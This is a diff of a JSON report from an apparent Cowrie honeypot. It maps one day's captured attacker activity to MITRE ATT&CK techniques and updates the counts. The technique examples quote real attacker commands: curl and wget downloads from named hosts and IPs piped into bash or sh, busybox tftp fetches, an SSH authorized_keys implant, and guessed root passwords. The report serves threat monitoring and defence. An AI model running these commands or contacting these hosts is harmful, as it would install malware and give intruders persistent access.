@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-24 11:02:27",
+  "generated": "2026-08-24 12:03:45",
   "totals": {
-    "commands": 193,
-    "login_failed": 624,
-    "login_success": 61,
-    "sessions": 749
+    "commands": 384,
+    "login_failed": 783,
+    "login_success": 64,
+    "sessions": 911
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 624,
+      "count": 783,
       "examples": [
         "root / 123456",
         "root / 12345678",
@@ -21,14 +21,14 @@
         "root / 1q2w3e4r"
       ],
       "first": "2026-08-24T00:00:38.589360Z",
-      "last": "2026-08-24T11:00:52.710129Z",
-      "unique_ips": 59
+      "last": "2026-08-24T11:59:25.590316Z",
+      "unique_ips": 63
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 61,
+      "count": 64,
       "examples": [
         "root / e10adc39",
         "ubuntu / ubuntu",
@@ -37,45 +37,14 @@
         "root / root"
       ],
       "first": "2026-08-24T00:20:02.041462Z",
-      "last": "2026-08-24T10:53:40.959024Z",
-      "unique_ips": 44
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 21,
-      "examples": [
-        "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
-        "https://del.sou.pp.ua/install.sh",
-        "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s",
-        "https://del.sou.pp.ua/install_tm.sh",
-        "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
-      ],
-      "first": "2026-08-24T00:50:34.498920Z",
-      "last": "2026-08-24T08:03:13.126981Z",
-      "unique_ips": 7
-    },
-    {
-      "id": "T1082",
-      "name": "System Information Discovery",
-      "tactic": "Discovery",
-      "count": 14,
-      "examples": [
-        "uname -a",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "/bin/./uname -s -v -n -r -m"
-      ],
-      "first": "2026-08-24T00:42:00.777388Z",
-      "last": "2026-08-24T09:51:08.849462Z",
-      "unique_ips": 11
+      "last": "2026-08-24T11:58:11.747410Z",
+      "unique_ips": 46
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 11,
+      "count": 26,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -84,8 +53,39 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-24T00:50:33.416948Z",
-      "last": "2026-08-24T09:03:14.389500Z",
-      "unique_ips": 9
+      "last": "2026-08-24T11:59:50.044271Z",
+      "unique_ips": 10
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 25,
+      "examples": [
+        "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
+        "https://del.sou.pp.ua/install.sh",
+        "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s",
+        "https://del.sou.pp.ua/install_tm.sh",
+        "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
+      ],
+      "first": "2026-08-24T00:50:34.498920Z",
+      "last": "2026-08-24T11:59:50.044271Z",
+      "unique_ips": 8
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 15,
+      "examples": [
+        "uname -a",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "/bin/./uname -s -v -n -r -m"
+      ],
+      "first": "2026-08-24T00:42:00.777388Z",
+      "last": "2026-08-24T11:43:24.589907Z",
+      "unique_ips": 12
     },
     {
       "id": "T1059.004",
@@ -106,14 +106,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 5,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "id"
+        "id",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-24T02:00:04.192282Z",
-      "last": "2026-08-24T09:03:14.389500Z",
-      "unique_ips": 4
+      "last": "2026-08-24T11:58:15.274092Z",
+      "unique_ips": 5
     },
     {
       "id": "T1070.004",
@@ -191,16 +192,20 @@
   ],
   "unmapped": [
     [
+      "/bin/busybox",
+      163
+    ],
+    [
       "shell",
-      18
+      20
     ],
     [
       "sh",
-      17
+      19
     ],
     [
       "system",
-      16
+      18
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -208,7 +213,7 @@
     ],
     [
       "enable",
-      10
+      11
     ],
     [
       "zalee",
@@ -224,23 +229,23 @@
     ],
     [
       "cd /proc && cat self/cmdline",
-      7
+      8
     ],
     [
       "/bin/busybox UNSTABLE",
-      6
+      7
     ],
     [
       "linuxshell",
-      6
+      7
     ],
     [
       "enablelinuxshell",
-      6
+      7
     ],
     [
       "ping ;sh",
-      6
+      7
     ],
     [
       "ping; sh",
@@ -264,10 +269,6 @@
     ],
     [
       "cat /tmp/bendi.py | python3 - ; rm -f /tmp/bendi.py",
-      1
-    ],
-    [
-      "rm -f /tmp/bendi.py",
       1
     ]
   ]
